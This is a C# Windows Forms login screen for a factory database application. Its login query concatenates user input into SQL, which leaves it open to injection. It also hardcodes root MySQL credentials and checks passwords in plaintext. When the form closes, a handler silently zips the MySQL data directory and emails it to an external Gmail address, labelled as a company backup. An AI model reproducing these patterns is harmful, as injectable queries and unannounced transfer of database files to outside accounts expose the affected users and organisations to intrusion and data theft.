using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MySql.Data.MySqlClient;
using System.IO;
using System.IO.Compression;
using System.Net.Mail;


namespace Myfactory
{
    public partial class LoiginForm : Form
    {   
        static string connStr = "server=Localhost;database=work;port=3306;username=root;password=123456789;charset=utf8;";
        MySqlConnection conn = new MySqlConnection(connStr);//資料庫設定

        public LoiginForm()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e) //消除鍵
        {

            tbUserName.Text = "";
            tbPWD.Text = "";
        }

        private void button1_Click(object sender, EventArgs e) //登入鍵
        {


            if ((tbUserName.Text.Trim() == "") || (tbPWD.Text.Trim() == ""))
            {
                MessageBox.Show("請輸入帳號/密碼", "提示", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else
            {
                try
                {
                    string sql = "select * from idtable where id = '" + tbUserName.Text + "' ";
                    DataTable dt = new DataTable();
                    MySqlDataAdapter adapter = new MySqlDataAdapter(sql, connStr);
                    adapter.Fill(dt);
                    if (dt.Rows.Count > 0)
                    {
                        if (tbPWD.Text == dt.Rows[0][1].ToString())
                        {
                            conn.Open();
                            MessageBox.Show("登入成功", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            FactoryForm FactoryForm = new FactoryForm();
                            this.Hide();
                            FactoryForm.Show();
                        }
                        else
                        {
                            MessageBox.Show("帳號/密碼錯誤", "錯誤", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else
                    {
                        MessageBox.Show("帳號/密碼錯誤", "錯誤", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
        }

        private void LoiginForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                string startPath = @"C:\ProgramData\MySQL\MySQL Server 8.0\Data\test";
                string zipPath = @".\result.zip";

                if (System.IO.File.Exists(zipPath))
                {
                    try
                    {
                        System.IO.File.Delete(zipPath);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                    }
                }
                ZipFile.CreateFromDirectory(startPath, zipPath);

                System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage();
                msg.To.Add("2586611811v@gmail.com");
                msg.From = new MailAddress("xx@gmail.com", "Michael", System.Text.Encoding.UTF8);
                msg.Subject = "公司資料備份";//郵件標題 
                msg.SubjectEncoding = System.Text.Encoding.UTF8;
                msg.Attachments.Add(new Attachment(zipPath));
                msg.Body = "公司資料備份";//郵件內容 
                msg.BodyEncoding = System.Text.Encoding.UTF8;
                msg.IsBodyHtml = true;
                msg.Priority = MailPriority.High;

                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("2586611811v@gmail.com", "密碼");
                object userState = msg;
                client.Send(msg);
                client.Dispose();
                msg.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            Application.Exit();
        }
    }
}
